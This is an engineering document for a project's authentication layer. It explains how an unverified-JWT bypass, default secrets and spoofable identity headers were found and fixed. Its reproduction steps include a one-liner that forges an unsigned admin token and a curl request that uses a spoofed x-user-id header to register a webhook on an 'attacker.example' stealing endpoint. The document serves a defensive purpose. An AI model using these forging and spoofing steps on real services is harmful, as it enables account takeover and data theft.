# Authentication

How a request proves who it is, from the login form to a database row.

This document exists because the answer used to be "it doesn't" — see §1.

---

## 1. The bypass this replaced (#82)

`services/platform-api/src/middleware/auth.ts` decoded the middle segment of
the Bearer token and trusted whatever it found:

```js
const parts = token.split('.');
if (parts.length !== 3) return null;
const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
if (payload.sub && payload.email && payload.role) {
  return { id: payload.sub, email: payload.email, role: payload.role };
}
```

No signature verification. No expiry check. `jsonwebtoken` was not a dependency
of the package. platform-api owns every console endpoint and all persisted
data, so any string of the form `<anything>.<base64url claims>.<anything>`
authenticated as whoever the claims named — including `"role": "admin"`.

Reproduced against a running server before the fix, with a victim user and a
private project seeded:

```console
$ FORGED="x.$(node -e "process.stdout.write(Buffer.from(JSON.stringify({
    sub:'22222222-2222-4222-8222-222222222222',
    email:'attacker@evil.example', role:'admin'})).toString('base64url'))").x"

$ curl -H "Authorization: Bearer $FORGED" localhost:4399/api/v1/projects
{"success":true,"data":{"items":[{"id":"3333…","ownerId":"2222…",
 "title":"Victim Secret Project","description":"confidential", …}],"total":1}}
HTTP 200
```

Same request after the fix:

```console
$ curl -H "Authorization: Bearer $FORGED" localhost:4400/api/v1/projects
{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid or expired token"}}
HTTP 401
```

The issue was filed as a naming mismatch (`userId` vs `sub`). Renaming the
claim alone would have made login work while leaving the bypass in place, which
is worse than leaving it visibly broken.

---

## 2. The token

One token, issued by `services/auth`, verified by everything else.

|              |                                                          |
| ------------ | -------------------------------------------------------- |
| Algorithm    | **HS256**, pinned on both the signing and verifying side |
| Secret       | `JWT_SECRET`, shared by auth, platform-api and realtime  |
| Subject      | **`sub`** — the registered claim, RFC 7519 §4.1.2        |
| Other claims | `email`, `role`, `tier`, `jti`                           |
| Lifetime     | `JWT_EXPIRES_IN`, default `1h`. `exp` is **required**    |

### Why `sub` and not `userId`

Three services read tokens and each spelled the subject differently: the auth
service signed `userId`, platform-api looked for `sub` and found nothing, and
the realtime service looked for its own `userId`. Standardising on the
registered name means one claim, spelled one way, everywhere. A token carrying
the old `userId` and no `sub` no longer authenticates, and a test pins that so
the old shape cannot quietly return.

### What verification enforces

Every service applies the same three rules:

1. **The signature verifies** against `JWT_SECRET`.
2. **The algorithm is HS256**, enforced by passing an allow-list to
   `jwt.verify`. This is what rejects `alg: none` and stops algorithm
   confusion — without the allow-list a token nominates its own algorithm and
   the library honours it.
3. **`exp` is present and in the future.** `jsonwebtoken` checks `exp` against
   the clock when the claim is present but accepts a token that omits it, so
   the presence check is explicit. Note `requireExp` is a **`jose`** option;
   passing it to `jsonwebtoken` is silently ignored, which looks like a check
   and is not one.

A verified signature proves provenance, not usability: a token that verifies
but carries no `sub` is still rejected.

`optionalAuth` is optional about _presence_, not validity. A token that is
present and fails verification is discarded rather than trusted.

---

## 3. `JWT_SECRET` is required

No service has a fallback. The defaults that used to exist —
`'animaforge-dev-secret'` in auth, `'dev-secret'` in realtime,
`'dev-secret-change-me'` in a platform-api config field — are gone.

A default secret committed to a repository is a published secret: anyone can
mint a valid admin token against a deployment that forgot to set the variable,
and nothing about that deployment looks broken. As a bonus failure mode, those
two live defaults were _different_ strings, so an auth-signed token would have
failed the realtime handshake anyway.

platform-api asserts the secret at startup and exits 1:

```console
$ PORT=4401 npx tsx src/index.ts        # with JWT_SECRET unset
[ERROR] JWT_SECRET is not set. platform-api verifies every request against it
and refuses to start without one — there is no development default, because a
default secret is a published secret. …
EXIT CODE: 1
```

Tests supply their own via a vitest `setupFiles`, generated per run with
`randomBytes` rather than written as a literal.

> **Not fixed, different owner:** `services/collab/src/auth.ts:1` still has
> `process.env.JWT_SECRET || 'dev-secret-change-in-production'`.

---

## 4. The browser side (#80)

### Where the token lives

| Store                              | Read by                                                   |
| ---------------------------------- | --------------------------------------------------------- |
| `localStorage['animaforge_auth']`  | the auth store, for user + token                          |
| `localStorage['animaforge_token']` | `lib/auth.ts` `getToken()`, used by every proxied request |
| cookie `animaforge_token`          | `middleware.ts`, which runs on the server                 |

All three are written by `persistAuth` and cleared by `clearPersistedAuth`. The
two localStorage keys are not redundancy for its own sake — the store was
writing only the first while the API layer read only the second, so requests
went out unauthenticated even while the console said the user was signed in.

The cookie exists because route protection runs server-side and the server
cannot read localStorage. It is not `HttpOnly`: it is written by client code,
and marking it `HttpOnly` would stop the browser accepting it. `SameSite=Lax`
keeps it off cross-site requests. The token's integrity comes from its
signature, not from where the browser keeps it.

### Route protection

`apps/web/src/middleware.ts`. There was no middleware at all before; the only
thing in front of the dashboard was `AuthGuard`, a client component that
redirects after the page has already been sent.

- Protected: the `(dashboard)`, `(enterprise)`, `(developer)`, `(studio)` and
  `(onboarding)` route groups, by prefix.
- Public: `(auth)`, `(marketing)`, `(legal)`, `/verify`, `/review`, and the
  named reference pages that live under `(dashboard)` — `/developers`,
  `/help`, `/changelog`, `/docs`, `/a11y-test`, `/marketplace/browse`.
- A request with no session cookie is redirected to `/login?next=<path>`. The
  login page honours `next` only when it is a single-slash absolute path, so it
  cannot be turned into an open redirect.

**The middleware checks that a token is present, not that it is valid.**
Verifying a signature needs the secret, which has no business on the edge
runtime, and a page that renders with a bad token still cannot read anything —
every request it makes answers 401. This is a redirect for the signed-out. The
authorization boundary is the API. Treating the middleware as the boundary
would be the same category of mistake as trusting an unverified token.

### The demo session that made all of this moot

`authStore.loadFromStorage()` fabricated a session whenever nothing was
persisted:

```js
const demoUser = { id: 'user_demo', email: 'shadow@animaforge.io', … };
persistAuth(demoUser, 'demo_token_animaforge');
```

Every visitor was authenticated, which is why route protection had nothing to
protect. Since #82 that token is not a JWT and every API call made with it is
rejected — the console looked signed in and could load nothing. It is gone.

### Signing out

`authStore.logout()` existed and had no caller anywhere in the app. The avatar
in the top bar was a button labelled "User menu" whose `onClick` body was
`// TODO: open user dropdown`. `UserMenu.tsx` now renders a real
`[role="menu"]`; signing out clears all three stores and replaces to `/login`.

---

## 5. Running it

```bash
export JWT_SECRET="$(openssl rand -hex 32)"   # same value for all three
export DATABASE_URL=postgresql://…            # auth and platform-api share it
```

`services/auth` signs. `services/platform-api` and `services/realtime` verify.
A mismatch is now a 401 on every request rather than something nothing noticed.

### The e2e harness

`playwright.config.ts` starts auth (:3003), platform-api (:4000) and a
production build of the web app (:3000), all on one `JWT_SECRET` and one
`DATABASE_URL`. `tests/e2e/fixtures/global-setup.ts` registers the fixture user
through the real `/auth/register`, logs in, and creates the fixture project
through platform-api **with the token auth just issued** — so a disagreement
about the secret or the claim fails setup loudly instead of leaving six specs
asserting against an empty page.

```bash
createdb animaforge_e2e
DATABASE_URL=… npx prisma migrate deploy --schema packages/db/prisma/schema.prisma
DATABASE_URL=… npm run db:seed --workspace @animaforge/db
npx playwright test --project=chromium
```

Ports are overridable (`E2E_WEB_PORT`, `E2E_AUTH_PORT`, `E2E_PLATFORM_PORT`)
for when something else already holds one.

---

## 6. The job queue (#80)

Included here because submission is authenticated and ownership-checked.

The pipeline had a consumer and no producer: `services/workers` declared five
BullMQ queues and ran a 600-line generation worker, but nothing in the
repository ever called `generationQueue.add()`. A job could not be started from
anywhere and `/render-queue` was permanently empty.

`POST /api/v1/jobs` closes it. In order:

1. Validate, and check the caller **owns the project** — otherwise the job
   would be created against someone else's project and its output would land
   there.
2. Write the `generation_jobs` row as `queued`.
3. Enqueue under **that row's id**, so every status the worker writes lands on
   the row the console is already displaying.

The row is written before the enqueue deliberately: a deployment with no worker
running then shows a queue that is filling up, which is true, rather than one
that looks empty. If the enqueue fails, the row is marked `failed` with the
reason and the response is 503 — a row left at `queued` reads as "waiting its
turn" when nothing will ever run it.

The two services share a contract, not code:

|            |                                                          |
| ---------- | -------------------------------------------------------- |
| Queue name | `generation`                                             |
| Job name   | `generate`                                               |
| Payload    | `{ type, project_id, user_id, params, tier, priority? }` |
| Job id     | the `generation_jobs` row id                             |

The payload is `GenerationJobData` in
`services/workers/src/workers/generationWorker.ts`. Renaming a field on one
side breaks the pipeline silently — the job is accepted and then fails inside
the worker — so the shape is pinned by a test.

Verified end to end against Postgres and Redis with the worker running:

```
submit   -> HTTP 201, status queued
db row   -> queued
bullmq   -> job present under the same id, payload matching GenerationJobData
listing  -> visible as queued
worker   -> queued -> running -> failed   (AI API unreachable locally; the
            reason is recorded on the row), retried 3x per the queue's backoff
```

---

## 7. The rest of the trust boundary

Section 1 describes the bypass fixed in platform-api's `requireAuth` (#82). That
fix was correct and it was incomplete: the same unverified decode survived in
three other places, because it was applied as a copy rather than a shared
dependency. This section covers closing those, and the decision about how.

### 7.1 What was still open

**`services/gateway/src/middleware/authForward.ts`.** The front door. It
base64-decoded the token and set `x-user-id` / `x-user-role` / `x-user-tier`
from whatever it found, then proxied to platform-api. It also never removed
inbound identity headers, so a request that simply set `x-user-id` itself — no
token at all — had that header forwarded untouched.

The gateway's own suite asserted this was correct. `gateway.test.ts` built a
token with `const signature = 'fakesignature'` under the name _"forwards
x-user-id from decoded JWT"_. That test is kept and inverted rather than
deleted; the header-level assertions now live in `authForward.test.ts`, which
mounts the middleware on an echo app so it can see what would actually be sent
upstream. A status-code assertion could not, which is why the original passed
against a broken implementation.

**`services/platform-api/src/routes/devportal.ts`.** Nine routes, none with
`requireAuth`, every user-scoped one reading
`(req.headers['x-user-id'] as string) ?? 'anonymous'`. Reproduced against the
running service before the fix, with no `Authorization` header at all:

```
$ curl -X POST localhost:3001/api/v1/developer/webhooks \
       -H 'x-user-id: victim-user-0001' \
       -d '{"url":"https://attacker.example/steal","events":["job.completed"]}'
201 Created  {"userId":"victim-user-0001","url":"https://attacker.example/steal",...}

$ curl localhost:3001/api/v1/developer/webhooks -H 'x-user-id: victim-user-0001'
200 OK       [ ...the victim's webhooks... ]
```

That registers an attacker-controlled delivery endpoint on someone else's
account. The `?? 'anonymous'` fallback made it worse: omit the header entirely
and every caller shared one identity, so `anonymous`'s sandbox credentials were
readable by anyone.

After:

```
$ curl -X POST localhost:3001/api/v1/developer/webhooks \
       -H 'x-user-id: victim-user-0001' -d '{...}'
401 {"success":false,"error":{"code":"UNAUTHORIZED","message":"Authentication required"}}

$ curl ... -H "Authorization: Bearer <forged>.<claims>.fakesignature"
401 {"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid or expired token"}}

$ curl ... -H "Authorization: Bearer <valid token for real-user-9999>" \
           -H 'x-user-id: victim-user-0001' -d '{...}'
201 {"userId":"real-user-9999",...}     <- the header is ignored
```

**`services/collab/src/auth.ts`.** Live on the WebSocket upgrade
(`index.ts:48`). Decoded without verifying and checked only `exp`, so any client
could join any project's Yjs document as any user, read and write shared state
and hold shot locks under that identity. It also carried
`process.env.JWT_SECRET || 'dev-secret-change-in-production'` — a published
secret, in a file that reads as though it authenticates.

**Two authorization bugs found in the same sweep**, distinct from the
authentication ones: `testWebhook` and `getWebhookLogs` took a webhook id and
never consulted its owner, so any authenticated user could fire deliveries on,
and read the delivery history of, any webhook whose id they could guess.
`deleteWebhook` already checked ownership; those two did not. Both now require
the owner.

### 7.2 Defence in depth: identity headers are stripped

Fixing the gateway is not sufficient on its own. The gateway sets `x-user-id`
from a verified token, which is a reasonable pattern, but it only holds if
platform-api is unreachable except through the gateway — and it is not.
platform-api listens on its own port, addressable directly in development and by
other pods in the compose and k8s topologies.

`services/platform-api/src/middleware/stripIdentityHeaders.ts` therefore removes
`x-user-id`, `x-user-role`, `x-user-tier` and `x-user-email` from every inbound
request before any handler runs. There is no allow-list for a trusted proxy:
"the request came from the gateway" is only as trustworthy as the network, and
authentication should not depend on network position. Identity comes from
`req.user`, populated by `requireAuth` after a signature check, and nothing else.

Fixing devportal closes that route. Stripping closes the class, so the next
handler that reaches for a convenient header cannot reintroduce it.

### 7.3 Middleware order in the gateway

`authForward` now runs _before_ `globalLimiter` and `requestLogger`. It used to
run after, and both of those read `x-user-id` — the rate limiter keys its
buckets on it. A caller could therefore choose their own rate-limit bucket, or
poison another user's, just by sending the header.

### 7.4 One verifier or three: the decision, and why

Three copies of security-critical verification code is how the next bypass gets
introduced — this incident is the proof, since #86 fixed one copy and left
three. Extraction into `packages/shared` was the preferred option and was
attempted first.

It does not work without restructuring the build of three services. Every
service sets `rootDir: "src"`, so importing a sibling package's TypeScript
source fails:

```
error TS6059: File 'packages/shared/src/jwt.ts' is not under 'rootDir'
'services/gateway/src'. 'rootDir' is expected to contain all source files.
```

(The `paths` mapping resolves the module; `rootDir` is the blocker, and it
fails on `tsc --noEmit` as well as on the build.) The module systems also
differ — gateway is `commonjs`/`node`, collab is `NodeNext`, platform-api
extends the root config — so `packages/shared`'s subpath `exports` are
unreachable from gateway's resolver.

Making it work means either relaxing `rootDir` in three services, which changes
the `dist/` layout and breaks `"start": "node dist/index.js"` and three
Dockerfiles, or giving `packages/shared` its own tsconfig and build output and
wiring build-ordering into CI and those Dockerfiles. That is a build and deploy
restructure, and it is not something to land inside a security fix.

**So: three copies, deliberately, plus the mechanism the extraction was meant to
provide.** Each copy carries a header comment naming
`services/platform-api/src/middleware/auth.ts` as canonical and pointing here.
More importantly, each service now runs the _same regression suite_ — forged
unsigned, `alg: none`, wrong secret, expired, no `exp`, no `sub`. If one copy
drifts, its own tests fail. That is what actually holds them in step; a shared
module would have been the tidier way to get there.

If someone later restructures the service builds, extracting this is worth
doing, and the test suites are the safety net for that change.

### 7.5 Fail shut, and why `verifyToken` does not throw

A missing `JWT_SECRET` is caught by the same `catch` that handles a bad
signature, so `verifyToken` returns `null` rather than throwing. That is
deliberate and consistent across all three services: no token authenticates
while a service is misconfigured. It is not "accepts everything", and not
"throws past the caller" either.

What makes the misconfigured state _loud_ is `assertAuthConfigured()`, called
from each entrypoint, which refuses to start the process at all. Gateway and
collab now do this, matching platform-api.

### 7.6 Known, and deliberately not changed

`packages/logger/src/requestLogger.ts` reads `x-user-id` for log annotation. It
is not an authentication path, and nothing currently depends on
`@animaforge/logger` — the package has no consumers. It is noted here rather
than changed, because changing a dormant package as part of this would be scope
the sweep does not need.
